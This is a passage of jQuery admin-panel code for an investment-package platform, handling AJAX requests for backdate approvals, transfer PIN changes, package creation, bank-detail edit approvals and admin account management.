	title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
	closeAnimation: 'left',content: "Business Executive to be transfered can't be the same as Business Executive to transfer clients to!"
	 });
	 }

	else{
	 $.alert({
	title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
	closeAnimation: 'left',content: "Error"
	 });
	 }
	//alert(data);

	}
	});
		
	});
	
$('.undo_package_sub').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/unbuy_package.php",
  method:"POST",
  data:$('#undo_package_sub_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Package Subscription has been undone successfully"
		});
	 	$('.approve_modal').modal("hide");
		$('#approve_pac_undo_modal'+id).html("<small class='badge badge-success'>Approved</small>");	
	 	//setTimeout( function(){ window.location.href = "view_packages";}, 4000);
	 }	
	 
	  else if(data == "backdate_request_pending"){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Backdate request has been sent for this investment, please undo backdate first!"
		});
	 }

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error!"
		});
	 }
		
  }
  });
});

$('.accountant_undo_backdate').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/accountant_undo_backdate.php",
  method:"POST",
  data:$('#accountant_undo_backdate_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Backdate has been undone successfully"
		});
	 	setTimeout( function(){ window.location.href = "accountant_backdate_requests";}, 4000);
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error!"
		});
	 }
		
  }
  });
});

$('#admin_mark_as_read').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/mark_as_read.php",
  method:"POST",
  //data:$('#mark_as_read_form'+id).serialize(),
  success:function(data){
	 // if(data == "success"){
	 // 	$('#checked').empty();
	 // 	$('#checked').addClass('badge badge-sm badge-success');
	 // 	$('#checked').html('Read');
	 setTimeout( function(){ window.location.href = "notifications";}, 1000);
	 // }	
	 // else{
	 // 	$.alert({
		// 	title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
		// 	closeAnimation: 'left',content: "Error in reversing debit!"
		// });
	 // }
		
  }
  });
});

$('.admin_mark_as_unread').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/mark_as_unread.php",
  method:"POST",
  data:$('#admin_mark_as_unread_form'+id).serialize(),
  success:function(data){
	 if(data.status == 'success'){
	 	$('#checked'+id).empty();
	 	$('#checked'+id).addClass('badge badge-sm badge-danger');
	 	$('#checked'+id).html('Unread');
	 	$('#unread'+id).empty();
	 	$('#badge').css("display", "block");
	 	$('#badge').html(data.message);
	 	//alert(data.message);

	 	//setTimeout( function(){ window.location.href = "notifications";}, 1000);
	 }	
	 // else{
	 // 	$.alert({
		// 	title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
		// 	closeAnimation: 'left',content: "Error in reversing debit!"
		// });
	 // }
		
  }
  });
});

$('#change_transfer_pin').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_scripts/change_transfer_pin.php",
  method:"POST",
  data:$('#change_transfer_pin_form').serialize(),
  beforeSend: function(){
      $('#change_transfer_pin').text("Changing...");
      $('#change_transfer_pin').attr("disabled", true);
  },
  success:function(data){
  	// alert(data);
	 if(parseInt(data) == 200){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Transfer Pin changed successfully"
		});
		setTimeout( function(){ window.location.href = "change_transfer_pin";}, 4000);
	 }

	 else if(parseInt(data) == 300){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "You do not have a transfer pin"
		});
	 }

	 else if(parseInt(data) == 400){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Incorrect old pin"
		});
	 }

	 else if(parseInt(data) == 500){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Your pins do not match"
		});
	 }
	 else if(parseInt(data) == 600){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Your pin must be 4 digits"
		});
	 }

	 else if(parseInt(data) == 700){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found"
		});
	 }
	 
	 else if(parseInt(data) == 800){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Your pin has to be numbers"
		});
	 }
	
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in Changing Pin"
		});
	 }
	 $('#change_transfer_pin').text("Change Pin");
      $('#change_transfer_pin').attr("disabled", false);
		
  }
  });
});

$('.delete_notification').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_scripts/delete_notification.php",
  method:"POST",
  data:$('#mark_as_unread_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Notification successfully deleted"
		});
	 	setTimeout( function(){ window.location.href = "notifications";}, 4000);
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in deleting notification!"
		});
	 }
		
  }
  });
});

$('.allocate_cash').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/allocate_cash.php",
  method:"POST",
  data:$('#allocate_cash_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Cash has been allocated successfully"
		});
	 	setTimeout( function(){ window.location.href = "allocate_cash";}, 4000);
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in allocating cash!"
		});
	 }
		
  }
  });
});

$('#submit_rating').click(function(e){
e.preventDefault();
//let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/submit_rating.php",
  method:"POST",
  data:$('#submit_rating_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Your rating for this MM has been submitted successfully"
		});
	 	setTimeout( function(){ window.location.href = "rate_mm";}, 4000);
	 }
	 else if(data == "empty_fields"){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Rating cannot be empty!"
		});
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in submitting rating!"
		});
	 }
		
  }
  });
});

$('#package_term_condition').click(function(e){
	for ( instance in CKEDITOR.instances )
       CKEDITOR.instances[instance].updateElement();
e.preventDefault();
$.ajax({
  url:"ajax_admin/package_term_condition.php",
  method:"POST",
  data: $('#package_term_condition_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Terms and Conditions have been added successfully"
		});
		setTimeout( function(){ window.location.href = "package_term_condition";}, 3000);
	 }
	 else if(data == 'empty_fields'){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found"
		});
	 }	

	  else if(data == 'record_exists'){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Record already exist"
		});
	 }

	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error"
		});
	 }
		
  }
  });
});



$('#update_package_term_condition').click(function(e){
e.preventDefault();
for ( instance in CKEDITOR.instances )
       CKEDITOR.instances[instance].updateElement();
$.ajax({
  url:"ajax_admin/update_package_term_condition.php",
  method:"POST",
  data: $('#update_package_term_condition_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Term and Condition have been updated successfully"
		});
		setTimeout( function(){ window.location.href = "update_package_term_condition";}, 4000);
	 }
	 else if(data == 'empty_fields'){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found"
		});
	 }	

	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error"
		});
	 }
		
  }
  });
});


$('#add_area').click(function(e){
	for ( instance in CKEDITOR.instances )
       CKEDITOR.instances[instance].updateElement();
e.preventDefault();
$.ajax({
  url:"ajax_admin/add_area.php",
  method:"POST",
  data: $('#add_area_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "CCTV Area has been added successfully"
		});
		setTimeout( function(){ window.location.href = "add_area";}, 3000);
	 }
	 else if(data == 'empty_fields'){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found"
		});
	 }	

	  else if(data == 'record_exists'){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Record already exist"
		});
	 }

	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error"
		});
	 }
		
  }
  });
});

$('#add_unit').click(function(e){
	for ( instance in CKEDITOR.instances )
       CKEDITOR.instances[instance].updateElement();
e.preventDefault();
$.ajax({
  url:"ajax_admin/add_unit.php",
  method:"POST",
  data: $('#add_unit_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Unit has been added successfully"
		});
		setTimeout( function(){ window.location.href = "add_unit";}, 3000);
	 }
	 else if(data == 'empty_fields'){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found"
		});
	 }	

	  else if(data == 'record_exists'){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Record already exist"
		});
	 }

	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error"
		});
	 }
		
  }
  });
});


$('#assign_users_unit').click(function(e){;
e.preventDefault();
$.ajax({
  url:"ajax_admin/assign_users_to_unit.php",
  method:"POST",
  data: $('#assign_users_unit_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "User(s) has been assigned to unit successfully"
		});
		setTimeout( function(){ window.location.href = "assign_users_unit";}, 3000);
	 }
	 else if(data == 'empty_fields'){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found"
		});
	 }	

	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error"
		});
	 }
		
  }
  });
});


$('#unassign_users_unit').click(function(e){;
e.preventDefault();
$.ajax({
  url:"ajax_admin/unassign_users_unit.php",
  method:"POST",
  data: $('#assign_users_unit_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "User(s) has been unassigned to unit successfully"
		});
		setTimeout( function(){ window.location.href = "assign_users_unit";}, 3000);
	 }
	 else if(data == 'empty_fields'){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found"
		});
	 }
	 else if(data == 'unit_does_not_exist'){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "No users in this unit yet"
		});
	 }
	 else if(data == 'users_not_in_unit'){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Selected Users are not in this unit"
		});
	 }	

	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error"
		});
	 }
		
  }
  });
});


$('.accountant_approve_backdate_rec').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/accountant_approve_backdate_rec.php",
  method:"POST",
  data:$('#accountant_approve_backdate_rec_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Investment has been backdated successfully"
		});
	 	setTimeout( function(){ window.location.href = "acct_approve_backdated_rec";}, 4000);
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in backdating investment!"
		});
	 }
//alert(data);
		
  }
  });
});


$('.acct_reject_backdated_rec').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/acct_reject_backdated_rec.php",
  method:"POST",
  data:$('#acct_reject_backdated_rec_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Investment has been backdated successfully"
		});
	 	setTimeout( function(){ window.location.href = "acct_approve_backdated_rec";}, 4000);
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in backdating investment!"
		});
	 }
//alert(data);
		
  }
  });
});


$('.accountant_undo_backdate_rec').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/accountant_undo_backdate_rec.php",
  method:"POST",
  data:$('#accountant_undo_backdate_rec_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Backdate has been undone successfully"
		});
	 	setTimeout( function(){ window.location.href = "acct_approve_backdated_rec";}, 4000);
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error!"
		});
	 }
		
  }
  });
});

$('#create_package_IM').click(function(e){
			e.preventDefault();
            let package_description = CKEDITOR.instances['package_description'].getData();
		    let  package_name = $("#package_name").val();
		    let  package_category = $("#package_category").val();
		    let  package_type = $("#package_type").val();
		    let  package_unit_price = $("#package_unit_price").val();
		    let  min_no_slots = $("#min_no_slots").val();
		    let  moratorium = $("#moratorium").val();
		    let  free_liquidation_period = $("#free_liquidation_period").val();
		    let  liquidation_surcharge = $("#liquidation_surcharge").val();
		    let  tenure_of_product = $("#tenure_of_product").val();
		    let  float_time = $("#float_time").val();
		    let  multiplying_factor = $("#multiplying_factor").val();
		    let  capital_refund = $("#capital_refund").val();
		   // let $capital_refund = $("#capital_refund").val();
		    let  backdatable = $("#backdatable").val();
		    let  no_of_slots = $("#no_of_slots").val();
		    let  visibility = $("#visibility").val();
		    let  package_commission = $("#package_commission").val();

		   	//alert(package_name);

		   	if(package_type == '1'){

		   			$.ajax({
						url:"ajax_admin/create_fixed_package_IM.php",
						method:"POST",
						data: {package_description:package_description,package_name:package_name,package_category:package_category,
							package_type:package_type,package_unit_price:package_unit_price,min_no_slots:min_no_slots,moratorium:moratorium,
							free_liquidation_period:free_liquidation_period,liquidation_surcharge:liquidation_surcharge,
							tenure_of_product:tenure_of_product,float_time:float_time,multiplying_factor:multiplying_factor,capital_refund:capital_refund,
							backdatable:backdatable,no_of_slots:no_of_slots,visibility:visibility,package_commission:package_commission},
						
						success:function(data){
				
                		//	alert(data+"yes");
						if(data == 200){
							$.alert({
							title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "Your request to create "+package_name+" package has been sent successfully "
							});
						   setTimeout( function(){ window.location.href = "create_package_IM";}, 4000);
						}

						if(data == 300){
							$.alert({
							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "Some fields are empty"
							});
						}


	                    if(data == 400){
							$.alert({
							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "This package has been created already"
							});
						}

						if(data == 500){
							$.alert({
							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "Please check all parameters carefully"
							});
						}


					



							// setTimeout( function(){ window.location.href = "profile";}, 4000);
							}	


						
						});
		   	}

		   	if(package_type == '2'){

				let  recurrence_value = $("#recurrence_value").val();
				let  contribution_period = $("#contribution_period").val();
				let  incubation_period = $("#incubation_period").val();
				let  recurrence_type = $("#recurrence_type").val();

		   		$.ajax({
						url:"ajax_admin/create_recurrent_package_IM.php",
						method:"POST",
						data: {recurrence_value:recurrence_value,contribution_period:contribution_period,incubation_period:incubation_period,recurrence_type:recurrence_type,package_description:package_description,package_name:package_name,package_category:package_category,
							package_type:package_type,package_unit_price:package_unit_price,min_no_slots:min_no_slots,moratorium:moratorium,
							free_liquidation_period:free_liquidation_period,liquidation_surcharge:liquidation_surcharge,
							tenure_of_product:tenure_of_product,float_time:float_time,multiplying_factor:multiplying_factor,capital_refund:capital_refund,
							backdatable:backdatable,no_of_slots:no_of_slots,visibility:visibility,package_commission:package_commission},
						
						success:function(data){
				
                		//	alert(data+"yes");
						if(data == 200){
							$.alert({
							title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "Your request to create "+package_name+"package has been sent successfully "
							});
						   setTimeout( function(){ window.location.href = "create_package_IM";}, 4000);
						}

						if(data == 300){
							$.alert({
							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "Some fields are empty"
							});
						}


	                    if(data == 400){
							$.alert({
							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "This package has been created already"
							});
						}

						if(data == 500){
							$.alert({
							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "Please check all parameters carefully"
							});
						}


					



							// setTimeout( function(){ window.location.href = "profile";}, 4000);
							}	


						
						});

		   	}
              
		    
		
	});
	

$('#cmd_create_cat_IM').click(function(e){
			e.preventDefault();
         let package_description = CKEDITOR.instances['package_description'].getData();
		    let cat_name = $("#cat_name").val();

		    //alert(cat_name);
		   
              $.ajax({
						url:"ajax_admin/create_category_IM.php",
						method:"POST",
						data: {package_description:package_description,cat_name:cat_name},
						
						success:function(data){

							//alert(data);
				
                			
						if(data == 200){
							$.alert({
							title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "You have successfully sent a request to create this category..."
							});
						   setTimeout( function(){ window.location.href = "create_package_category_IM";}, 4000);
						}

					   if(data == 300){
							$.alert({
							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "Some fields are empty"
							});
						}

							if(data == 400){
							$.alert({
							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "This package category exists"
							});
						}

			

	                    if(data == 500){
							$.alert({
							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "Server Error"
							});
						}


					



							// setTimeout( function(){ window.location.href = "profile";}, 4000);
							}	


						
						});
		    
		
	});
	

	
$('.approve_package_creation').click(function(e){
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/approve_package_creation.php",
  method:"POST",
  data:$('#approve_package_creation_form'+id).serialize(),
  success:function(data){
  	// alert(data);
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Package Creation request has been approved successfully"
		});
		//setTimeout( function(){ window.locataion.href = "package_creation_requests";}, 1000);
		$('.approval_modal').modal("hide");
		$('#approve_pac_modal'+id).html("<small class='badge badge-success'>Approved</small>");
	 }
	 else if(data == 'empty_fields'){
		$.alert({
		title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
		closeAnimation: 'left',content: "Some fields are empty"
		});
	}


    else if(data == 'record_exists'){
		$.alert({
		title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
		closeAnimation: 'left',content: "This package has been created already"
		});
	}	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error approving request"
		});
	 }
		
  }
  });
});

$('.reject_package_creation').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/reject_package_creation.php",
  method:"POST",
  data:$('#reject_package_creation_form'+id).serialize(),
  success:function(data){
  	// alert(data);
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Package Creation rejected successfully"
		});
		//setTimeout( function(){ window.location.href = "package_category_requests";}, 1000);
		$('.reject_modal').modal("hide");
		$('#reject_pac_modal'+id).html("<small class='badge badge-danger'>Rejected</small>");
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error rejecting request"
		});
	 }
		
  }
  });
});


$('.approve_category_creation').click(function(e){
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/approve_category_creation.php",
  method:"POST",
  data:$('#approve_category_creation_form'+id).serialize(),
  success:function(data){
  	// alert(data);
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Package Category Creation request has been approved successfully"
		});
		//setTimeout( function(){ window.location.href = "package_category_requests";}, 1000);
		$('.approval_modal').modal("hide");
		$('#approve_cat_modal'+id).html("<small class='badge badge-success'>Approved</small>");
	 }
	 else if(data == 'empty_fields'){
		$.alert({
		title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
		closeAnimation: 'left',content: "Some fields are empty"
		});
	}


    else if(data == 'record_exists'){
		$.alert({
		title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
		closeAnimation: 'left',content: "This Category has been created already"
		});
	}	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error approving request"
		});
	 }
		
  }
  });
});


$('.reject_category_creation').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/reject_category_creation.php",
  method:"POST",
  data:$('#reject_category_creation_form'+id).serialize(),
  success:function(data){
  	// alert(data);
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Package Category Creation rejected successfully"
		});
		//setTimeout( function(){ window.location.href = "package_category_requests";}, 1000);
		$('.reject_modal').modal("hide");
		$('#reject_cat_modal'+id).html("<small class='badge badge-danger'>Rejected</small>");
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error rejecting request"
		});
	 }
		
  }
  });
});


$('#edit_user_bank_details').click(function(e){
e.preventDefault();
//let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/edit_user_bank_details.php",
  method:"POST",
  data:$('#edit_user_bank_details_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Request to edit User's Bank Details has been sent successfully"
		});
	 	setTimeout( function(){ window.location.href = "edit_user_bank_details";}, 4000);
	 }
	 else if(data == "empty_fields"){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found!"
		});
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in sending request!"
		});
	 }
		
  }
  });
});

$('.approve_change_bank_details').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/approve_change_bank_details.php",
  method:"POST",
  data:$('#approve_change_bank_details_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Request has been approved successfully"
		});
	 	setTimeout( function(){ window.location.href = "edit_user_bank_details_request";}, 4000);
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in approving request!"
		});
	 }
		
  }
  });
});


$('.approve_change_bank_details_sa').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/approve_change_bank_details_sa.php",
  method:"POST",
  data:$('#approve_change_bank_details_sa_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Request has been approved successfully"
		});
	 	$('.approve_modal').modal("hide");
		$('#approve_edit_bank_modal'+id).html("<small class='badge badge-success'>Approved</small>");	
	 	//setTimeout( function(){ window.location.href = "edit_bank_details_request_sa";}, 4000);
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in approving request!"
		});
	 }
		
  }
  });
});

$("#trigger_submit").click(function(){
	var id = $(this).data('id');

	$("#unique_id").html(id);
});

$('.disable_admin').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/disable_admin_account.php",
  method:"POST",
  data:$('#disable_admin_form'+id).serialize(),
  beforeSend: function(){
		$('.disable_admin').text("Deactivating");
		$('.disable_admin').attr("disabled", false);
	},
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Admin has been disabled successfully"
		});
	 	setTimeout( function(){ window.location.href = "account_users";}, 4000);
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in disabling admin!"
		});
	 }
	$('.disable_admin').text("Deactivate");
	$('.disable_admin').attr("disabled", false);
  }
  });
});

$('.enable_admin').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/enable_admin_account.php",
  method:"POST",
  beforeSend: function(){
		$('.enable_admin').text("Activating");
		$('.enable_admin').attr("disabled", false);
	},
  data:$('#enable_admin_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Admin has been enabled successfully"
		});
	 	setTimeout( function(){ window.location.href = "account_users";}, 4000);
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in enabling admin!"
		});
	 }
	$('.enable_admin').text("Activate");
	$('.enable_admin').attr("disabled", false);	
  }
  });
});


$('.reset_admin_password').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/reset_admin_password.php",
  method:"POST",
  data:$('#reset_admin_password_form'+id).serialize(),
  beforeSend: function(){
		$('.reset_admin_password').text("Reseting");
		$('.reset_admin_password').attr("disabled", false);
	},
  success:function(data){
	 if(parseInt(data) == 200){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Admin Password reset successfully"
		});
		setTimeout( function(){ window.location.href = "account_users";}, 4000);
	 }

	 else if(parseInt(data) == 300){

	 	$.alert({
